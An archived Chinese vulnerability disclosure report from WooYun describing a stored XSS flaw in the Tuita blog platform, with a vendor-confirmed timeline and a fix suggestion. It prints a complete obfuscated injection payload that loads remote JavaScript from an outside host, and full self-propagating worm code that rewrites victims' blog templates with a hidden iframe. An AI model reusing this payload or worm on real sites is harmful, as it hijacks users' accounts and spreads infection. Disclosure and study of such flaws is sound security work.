@@ -1,0 +1,368 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		盛大 - 推她 - 存储型XSS  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		盛大 - 推她 - 存储型XSS  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/gainover">gainover</a> 
+</li><li>提交时间：		2012-08-02 09:06</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-08-02：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-08-02：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-08-12：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-08-22：	细节向普通白帽子公开<br/>
+									2012-09-01：	细节向实习白帽子公开<br/>
+									2012-09-16：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">盛大tuita某处功能导致www.tuita.com域名下的存储型XSS，结合轻博客支持模板自定义的功能，可导致蠕虫。 因为我是公的，所以是“推她”～～  </p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">Tuita开放了用户页面模板自定义功能，主要操作则限制于www.tuita.com主域名下，因而要寻找该域名下的XSS。<br />
+<br />
+<br />
+<br />
+因为在特定标签下，可以展现我们所发布的内容。例如：<br />
+<br />
+<br />
+<br />
+我们随便发表一个内容，标签贴上：wooyuntest<br />
+<br />
+<br />
+<br />
+那么在，http://www.tuita.com/tagpage/wooyuntest 就可以看到我们发送的内容！<br />
+<br />
+<br />
+<br />
+---------------------------------------<br />
+<br />
+<br />
+<br />
+如果发布内容存在XSS的话，那么<br />
+<br />
+<br />
+<br />
+http://www.tuita.com/tagpage/wooyuntest <br />
+<br />
+<br />
+<br />
+页面将会出现XSS，从而被我们利用。<br />
+<br />
+<br />
+<br />
+---------------------------------------<br />
+<br />
+<br />
+<br />
+抱着这个目的，我们对发布内容进行XSS测试：<br />
+<br />
+<br />
+<br />
+1. 首先发布一个正常内容：<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/020054498af4867f3435642663a8e0928cd60769.jpg" target="_blank"><img src="../images/020054498af4867f3435642663a8e0928cd60769.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+2. 抓包，查看发送了什么数据：<br />
+<br />
+<br />
+<br />
+地址：http://www.tuita.com/post/create <br />
+<br />
+类型：POST<br />
+<br />
+数据：见图片!<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/020055059cc700d1e2c388bf01f91fde8695e85f.jpg" target="_blank"><img src="../images/020055059cc700d1e2c388bf01f91fde8695e85f.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+3. 可以看到content是JSON数据格式，当我们向song_id这个属性加入\u0022\u003E进行构造测试时，会发现。。。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/02005515c32e92f67bd110f6ad2175b00fd964bd.jpg" target="_blank"><img src="../images/02005515c32e92f67bd110f6ad2175b00fd964bd.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+4. 结果么，哦和~~ 侧漏了。 <br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/020055242cc85c5b95f2dffd1a536e49ca7c7de3.jpg" target="_blank"><img src="../images/020055242cc85c5b95f2dffd1a536e49ca7c7de3.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+知道怎么侧漏～，接着就简单了！<br />
+<br />
+<br />
+<br />
+5. 构造闭合代码：<br />
+<br />
+<br />
+<br />
+</p><pre><code>&quot;&gt;&lt;/object&gt;&lt;img/src=&quot;http://www.baidu.com/img/baidu_sylogo1.gif&quot;onload=&quot;window.s=document.createElement(String.fromCharCode(115,99,114,105,112,116));window.s.src=String.fromCharCode(104,116,116,112,58,47,47,105,116,115,111,107,108,97,46,100,117,97,112,112,46,99,111,109,47,106,46,106,115);document.body.appendChild(window.s)&quot;&gt;&lt;object&gt;&lt;i a=&quot;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+6. 编码一下，并放入发送数据中。<br />
+<br />
+<br />
+<br />
+</p><pre><code>{&quot;PlayerFlashVar&quot;:&quot;http:\/\/www.xiami.com\/widget\/0_376013\/singlePlayer.swf&quot;,&quot;song_id&quot;:&quot;376013\u0022\u003e\u003c\u002f\u006f\u0062\u006a\u0065\u0063\u0074\u003e\u003c\u0069\u006d\u0067\u002f\u0073\u0072\u0063\u003d\u0022\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0077\u0077\u0077\u002e\u0062\u0061\u0069\u0064\u0075\u002e\u0063\u006f\u006d\u002f\u0069\u006d\u0067\u002f\u0062\u0061\u0069\u0064\u0075\u005f\u0073\u0079\u006c\u006f\u0067\u006f\u0031\u002e\u0067\u0069\u0066\u0022\u006f\u006e\u006c\u006f\u0061\u0064\u003d\u0022\u0077\u0069\u006e\u0064\u006f\u0077\u002e\u0073\u003d\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u0063\u0072\u0065\u0061\u0074\u0065\u0045\u006c\u0065\u006d\u0065\u006e\u0074\u0028\u0053\u0074\u0072\u0069\u006e\u0067\u002e\u0066\u0072\u006f\u006d\u0043\u0068\u0061\u0072\u0043\u006f\u0064\u0065\u0028\u0031\u0031\u0035\u002c\u0039\u0039\u002c\u0031\u0031\u0034\u002c\u0031\u0030\u0035\u002c\u0031\u0031\u0032\u002c\u0031\u0031\u0036\u0029\u0029\u003b\u0077\u0069\u006e\u0064\u006f\u0077\u002e\u0073\u002e\u0073\u0072\u0063\u003d\u0053\u0074\u0072\u0069\u006e\u0067\u002e\u0066\u0072\u006f\u006d\u0043\u0068\u0061\u0072\u0043\u006f\u0064\u0065\u0028\u0031\u0030\u0034\u002c\u0031\u0031\u0036\u002c\u0031\u0031\u0036\u002c\u0031\u0031\u0032\u002c\u0035\u0038\u002c\u0034\u0037\u002c\u0034\u0037\u002c\u0031\u0030\u0035\u002c\u0031\u0031\u0036\u002c\u0031\u0031\u0035\u002c\u0031\u0031\u0031\u002c\u0031\u0030\u0037\u002c\u0031\u0030\u0038\u002c\u0039\u0037\u002c\u0034\u0036\u002c\u0031\u0030\u0030\u002c\u0031\u0031\u0037\u002c\u0039\u0037\u002c\u0031\u0031\u0032\u002c\u0031\u0031\u0032\u002c\u0034\u0036\u002c\u0039\u0039\u002c\u0031\u0031\u0031\u002c\u0031\u0030\u0039\u002c\u0034\u0037\u002c\u0031\u0030\u0036\u002c\u0034\u0036\u002c\u0031\u0030\u0036\u002c\u0031\u0031\u0035\u0029\u003b\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u0062\u006f\u0064\u0079\u002e\u0061\u0070\u0070\u0065\u006e\u0064\u0043\u0068\u0069\u006c\u0064\u0028\u0077\u0069\u006e\u0064\u006f\u0077\u002e\u0073\u0029\u0022\u003e\u003c\u006f\u0062\u006a\u0065\u0063\u0074\u003e\u003c\u0069\u0020\u0061\u003d\u0022&quot;,&quot;song_name&quot;:&quot;\u56ed\u6e38\u4f1a&quot;,&quot;artist_id&quot;:&quot;\u5468\u6770\u4f26&quot;,&quot;album_name&quot;:&quot;\u4e03\u91cc\u9999&quot;,&quot;album_logo&quot;:{&quot;55&quot;:&quot;http:\/\/img.xiami.com\/.\/images\/album\/img60\/1260\/66481314675280_3.jpg&quot;,&quot;100&quot;:&quot;http:\/\/img.xiami.com\/.\/images\/album\/img60\/1260\/66481314675280_1.jpg&quot;,&quot;185&quot;:&quot;http:\/\/img.xiami.com\/.\/images\/album\/img60\/1260\/66481314675280_2.jpg&quot;,&quot;300&quot;:&quot;http:\/\/img.xiami.com\/.\/images\/album\/img60\/1260\/66481314675280_4.jpg&quot;},&quot;audio_info&quot;:{&quot;album_logo&quot;:null,&quot;description&quot;:&quot;&lt;P&gt;ok! look!&lt;\/P&gt;&quot;}}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+7. 上面的利用代码，会使得 http://www.tuita.com/tagpage/wooyuntest 变成一个带有存储型XSS的页面，当受害者打开这个页面时，就会执行我们外部JS文件的内容。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/020055452e35ce5f726ccf9e79f70987118579ec.jpg" target="_blank"><img src="../images/020055452e35ce5f726ccf9e79f70987118579ec.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+8. 那么进一步对该漏洞的利用主要有2种方式！<br />
+<br />
+<br />
+<br />
+利用方式1：批量向【热门标签】推送带有XSS的内容！<br />
+<br />
+<br />
+<br />
+利用方式2：在自己的个人主页模板代码内，使用iframe嵌入 http://www.tuita.com/tagpage/wooyuntest 页面。 从而受害者在查看他人个人主页时，可以被感染恶意代码！<br />
+<br />
+<br />
+<br />
+9. 这里对第2种利用方式进行说明：<br />
+<br />
+<br />
+<br />
+在本人自己tuita的模板设置里，--》自定义HTML--》在 &lt;/body&gt;之前加入一个iframe<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;iframe src=&quot;http://www.tuita.com/tagpage/test&quot; style=&quot;display:none&quot; id=&quot;wooyun&quot;&gt;&lt;/iframe&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+然后将 http://1881056377.tuita.com/ 发送给受害者访问。<br />
+<br />
+<br />
+<br />
+受害者打开页面后，会执行http://www.tuita.com/tagpage/test中的恶意代码内容, 从而在自己的模板里也被插入一段恶意代码：&lt;iframe src=&quot;http://www.tuita.com/tagpage/test&quot; style=&quot;display:none&quot; id=&quot;wooyun&quot;&gt;&lt;/iframe&gt;<br />
+<br />
+<br />
+<br />
+10. 恶意代码如下：<br />
+<br />
+<br />
+<br />
+代码中调用的pkav库，见 http://itsokla.duapp.com/pkav.js<br />
+<br />
+<br />
+<br />
+</p><pre><code>if(pkav.is_domain(&quot;www.tuita.com&quot;)){<br />
+	//tuita xss worm<br />
+	function createPost(id){<br />
+		pkav.post(&quot;http://www.tuita.com/post/create&quot;,&quot;post_title=%E5%9B%AD%E6%B8%B8%E4%BC%9A&amp;post_content=%7B%22PlayerFlashVar%22%3A%22http%3A%5C%2F%5C%2Fwww.xiami.com%5C%2Fwidget%5C%2F0_376013%5C%2FsinglePlayer.swf%22%2C%22song_id%22%3A%22376013%5Cu0022%5Cu003e%5Cu003c%5Cu002f%5Cu006f%5Cu0062%5Cu006a%5Cu0065%5Cu0063%5Cu0074%5Cu003e%5Cu003c%5Cu0069%5Cu006d%5Cu0067%5Cu002f%5Cu0073%5Cu0072%5Cu0063%5Cu003d%5Cu0022%5Cu0068%5Cu0074%5Cu0074%5Cu0070%5Cu003a%5Cu002f%5Cu002f%5Cu0077%5Cu0077%5Cu0077%5Cu002e%5Cu0062%5Cu0061%5Cu0069%5Cu0064%5Cu0075%5Cu002e%5Cu0063%5Cu006f%5Cu006d%5Cu002f%5Cu0069%5Cu006d%5Cu0067%5Cu002f%5Cu0062%5Cu0061%5Cu0069%5Cu0064%5Cu0075%5Cu005f%5Cu0073%5Cu0079%5Cu006c%5Cu006f%5Cu0067%5Cu006f%5Cu0031%5Cu002e%5Cu0067%5Cu0069%5Cu0066%5Cu0022%5Cu006f%5Cu006e%5Cu006c%5Cu006f%5Cu0061%5Cu0064%5Cu003d%5Cu0022%5Cu0077%5Cu0069%5Cu006e%5Cu0064%5Cu006f%5Cu0077%5Cu002e%5Cu0073%5Cu003d%5Cu0064%5Cu006f%5Cu0063%5Cu0075%5Cu006d%5Cu0065%5Cu006e%5Cu0074%5Cu002e%5Cu0063%5Cu0072%5Cu0065%5Cu0061%5Cu0074%5Cu0065%5Cu0045%5Cu006c%5Cu0065%5Cu006d%5Cu0065%5Cu006e%5Cu0074%5Cu0028%5Cu0053%5Cu0074%5Cu0072%5Cu0069%5Cu006e%5Cu0067%5Cu002e%5Cu0066%5Cu0072%5Cu006f%5Cu006d%5Cu0043%5Cu0068%5Cu0061%5Cu0072%5Cu0043%5Cu006f%5Cu0064%5Cu0065%5Cu0028%5Cu0031%5Cu0031%5Cu0035%5Cu002c%5Cu0039%5Cu0039%5Cu002c%5Cu0031%5Cu0031%5Cu0034%5Cu002c%5Cu0031%5Cu0030%5Cu0035%5Cu002c%5Cu0031%5Cu0031%5Cu0032%5Cu002c%5Cu0031%5Cu0031%5Cu0036%5Cu0029%5Cu0029%5Cu003b%5Cu0077%5Cu0069%5Cu006e%5Cu0064%5Cu006f%5Cu0077%5Cu002e%5Cu0073%5Cu002e%5Cu0073%5Cu0072%5Cu0063%5Cu003d%5Cu0053%5Cu0074%5Cu0072%5Cu0069%5Cu006e%5Cu0067%5Cu002e%5Cu0066%5Cu0072%5Cu006f%5Cu006d%5Cu0043%5Cu0068%5Cu0061%5Cu0072%5Cu0043%5Cu006f%5Cu0064%5Cu0065%5Cu0028%5Cu0031%5Cu0030%5Cu0034%5Cu002c%5Cu0031%5Cu0031%5Cu0036%5Cu002c%5Cu0031%5Cu0031%5Cu0036%5Cu002c%5Cu0031%5Cu0031%5Cu0032%5Cu002c%5Cu0035%5Cu0038%5Cu002c%5Cu0034%5Cu0037%5Cu002c%5Cu0034%5Cu0037%5Cu002c%5Cu0031%5Cu0030%5Cu0035%5Cu002c%5Cu0031%5Cu0031%5Cu0036%5Cu002c%5Cu0031%5Cu0031%5Cu0035%5Cu002c%5Cu0031%5Cu0031%5Cu0031%5Cu002c%5Cu0031%5Cu0030%5Cu0037%5Cu002c%5Cu0031%5Cu0030%5Cu0038%5Cu002c%5Cu0039%5Cu0037%5Cu002c%5Cu0034%5Cu0036%5Cu002c%5Cu0031%5Cu0030%5Cu0030%5Cu002c%5Cu0031%5Cu0031%5Cu0037%5Cu002c%5Cu0039%5Cu0037%5Cu002c%5Cu0031%5Cu0031%5Cu0032%5Cu002c%5Cu0031%5Cu0031%5Cu0032%5Cu002c%5Cu0034%5Cu0036%5Cu002c%5Cu0039%5Cu0039%5Cu002c%5Cu0031%5Cu0031%5Cu0031%5Cu002c%5Cu0031%5Cu0030%5Cu0039%5Cu002c%5Cu0034%5Cu0037%5Cu002c%5Cu0031%5Cu0030%5Cu0036%5Cu002c%5Cu0034%5Cu0036%5Cu002c%5Cu0031%5Cu0030%5Cu0036%5Cu002c%5Cu0031%5Cu0031%5Cu0035%5Cu0029%5Cu003b%5Cu0064%5Cu006f%5Cu0063%5Cu0075%5Cu006d%5Cu0065%5Cu006e%5Cu0074%5Cu002e%5Cu0062%5Cu006f%5Cu0064%5Cu0079%5Cu002e%5Cu0061%5Cu0070%5Cu0070%5Cu0065%5Cu006e%5Cu0064%5Cu0043%5Cu0068%5Cu0069%5Cu006c%5Cu0064%5Cu0028%5Cu0077%5Cu0069%5Cu006e%5Cu0064%5Cu006f%5Cu0077%5Cu002e%5Cu0073%5Cu0029%5Cu0022%5Cu003e%5Cu003c%5Cu006f%5Cu0062%5Cu006a%5Cu0065%5Cu0063%5Cu0074%5Cu003e%5Cu003c%5Cu0069%5Cu0020%5Cu0061%5Cu003d%5Cu0022%22%2C%22song_name%22%3A%22%5Cu56ed%5Cu6e38%5Cu4f1a%22%2C%22artist_id%22%3A%22%5Cu5468%5Cu6770%5Cu4f26%22%2C%22album_name%22%3A%22%5Cu4e03%5Cu91cc%5Cu9999%22%2C%22album_logo%22%3A%7B%2255%22%3A%22http%3A%5C%2F%5C%2Fimg.xiami.com%5C%2F.%5C%2Fimages%5C%2Falbum%5C%2Fimg60%5C%2F1260%5C%2F66481314675280_3.jpg%22%2C%22100%22%3A%22http%3A%5C%2F%5C%2Fimg.xiami.com%5C%2F.%5C%2Fimages%5C%2Falbum%5C%2Fimg60%5C%2F1260%5C%2F66481314675280_1.jpg%22%2C%22185%22%3A%22http%3A%5C%2F%5C%2Fimg.xiami.com%5C%2F.%5C%2Fimages%5C%2Falbum%5C%2Fimg60%5C%2F1260%5C%2F66481314675280_2.jpg%22%2C%22300%22%3A%22http%3A%5C%2F%5C%2Fimg.xiami.com%5C%2F.%5C%2Fimages%5C%2Falbum%5C%2Fimg60%5C%2F1260%5C%2F66481314675280_4.jpg%22%7D%2C%22audio_info%22%3A%7B%22album_logo%22%3Anull%2C%22description%22%3A%22%3CP%3Eok%21+look%21%3C%5C%2FP%3E%22%7D%7D&amp;post_type=xiami&amp;blog_id=&quot;+id+&quot;&amp;sync_flag=0&amp;syn=&amp;post_tag=test&amp;sticky=0&amp;draft_id=451375&amp;from=home&amp;dtime=null&quot;,function(rs){<br />
+<br />
+		});<br />
+	}<br />
+	//获得用户的设置<br />
+	function getSetting(id){<br />
+		pkav.get(&quot;http://www.tuita.com/template/get?blog_id=&quot;+id+&quot;&amp;tsdump=&quot;+new Date().getTime(),function  (rs){<br />
+			var obj=eval(&quot;(&quot;+rs+&quot;)&quot;);<br />
+			if(obj.data&amp;&amp;obj.data.tpl_html&amp;&amp;obj.data.tpl_html.indexOf(&quot;wooyun&quot;)==-1){<br />
+				//说明还没有被感染~~<br />
+				obj.data.tpl_html=obj.data.tpl_html.replace(/&lt;\/body&gt;/,&quot;&lt;iframe src=\&quot;http://www.tuita.com/tagpage/test\&quot; style=\&quot;display:none\&quot; id=\&quot;wooyun\&quot;&gt;&lt;/iframe&gt;&lt;/body&gt;&quot;);<br />
+				saveSetting(id,obj);<br />
+			}else{<br />
+				try{<br />
+					console.log(&quot;done!&quot;);<br />
+				}catch(e){}<br />
+			}<br />
+		});<br />
+	}<br />
+	function saveSetting(id,obj){<br />
+		pkav.post(&quot;http://www.tuita.com/template/save&quot;,&quot;blog_id=&quot;+id+&quot;&amp;theme=0&amp;custom_vars=%5B%7B%22name%22%3A%22%5Cu5c55%5Cu793a%5Cu5934%5Cu50cf%22%2C%22group%22%3A%22%5Cu8bbe%5Cu7f6e%22%2C%22type%22%3A%22boolean%22%2C%22value%22%3Atrue%2C%22reset%22%3Atrue%7D%2C%7B%22name%22%3A%22%5Cu5c55%5Cu793a%5Cu6211%5Cu5173%5Cu6ce8%5Cu7684%5Cu535a%5Cu5ba2%22%2C%22group%22%3A%22%5Cu8bbe%5Cu7f6e%22%2C%22type%22%3A%22boolean%22%2C%22value%22%3Atrue%2C%22reset%22%3Atrue%7D%2C%7B%22name%22%3A%22%5Cu5c55%5Cu793a%5Cu641c%5Cu7d22%5Cu6846%22%2C%22group%22%3A%22%5Cu8bbe%5Cu7f6e%22%2C%22type%22%3A%22boolean%22%2C%22value%22%3Atrue%2C%22reset%22%3Atrue%7D%5D&amp;system_vars=%7B%22pagination_limit%22%3A%2210%22%7D&amp;tpl_html=&quot;+encodeURIComponent(obj.data.tpl_html)+&quot;&amp;contribute_type=&amp;contribute_tags=&amp;contribute_rules=&amp;contribute_save=1&quot;,function  (rs){<br />
+			try{<br />
+				console.log(&quot;ok!&quot;);<br />
+			}catch(e){}<br />
+		});<br />
+	}<br />
+	function getID(){<br />
+		pkav.get(&quot;http://www.tuita.com/home?hash=&quot;+Math.random(),function(rs){<br />
+			var id=pkav.fetch(rs,/http:\/\/www\.tuita\.com\/blogsetting\/(\d+)/);<br />
+			getSetting(id);<br />
+			//createPost(id);<br />
+		});<br />
+	}<br />
+	if(!window.___x){<br />
+		getID();<br />
+		window.___x=1;<br />
+	}<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+11. 漏洞效果见证明！ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">当受害者以登录态， 访问http://1881056377.tuita.com/之后，自己的博客也会被感染！<br />
+<br />
+<br />
+<br />
+访问以上地址的受害者，博客页面也插入了恶意代码，见下图：<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/02005611bb9db1f9f63442859134b6f2097c87f9.jpg" target="_blank"><img src="../images/02005611bb9db1f9f63442859134b6f2097c87f9.jpg" alt="" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">对post_content里song_id以及其它参数（未测试，但可能存在相同问题）的内容加以过滤。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/gainover" title="gainover">gainover</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-010477" title="盛大 - 推她 - 存储型XSS">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：12 </p>
+													<p class="detail">确认时间：2012-08-02 09:14</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢gainover提交漏洞信息。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="10477";
+var bugRating="2";
+var myRating="";
+var ratingCount="5";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
